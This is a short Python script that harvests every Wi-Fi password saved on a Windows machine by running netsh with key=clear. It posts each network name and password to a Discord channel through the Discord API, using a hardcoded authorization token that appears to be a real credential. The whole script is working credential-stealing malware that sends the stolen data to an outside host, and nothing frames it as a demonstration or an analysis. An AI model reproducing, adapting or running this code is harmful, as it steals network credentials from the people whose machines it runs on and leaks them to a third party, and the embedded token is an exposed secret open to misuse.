import requests
import time
import os
import subprocess


a = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore").split('\n')
a = [i.split(":")[1][1:-1] for i in a if "All User Profile" in i]
for i in a:
    try:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="ignore").split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            print ("{:<30}|  {:<}".format(i, results[0]))
            networks = "{:<30}|  {:<}".format(i, results[0])
            payload = {'content': networks}
            header = {
                'authorization':
                'NjcwNjkyODE5NTgwNjE2Nzc0.G_XgIs.jf-Ixb_zRa6Nfz-7gcspRlXo048wJ1GfXfUI80'
}
            r = requests.post(
                "https://discord.com/api/v9/channels/897222647325274152/messages",
                data=payload,
                headers=header)

        except IndexError:
            print ("{:<30}|  {:<}".format(i, ""))
    except subprocess.CalledProcessError:
        print ("{:<30}|  {:<}".format(i, "ENCODING ERROR"))
a = input("")







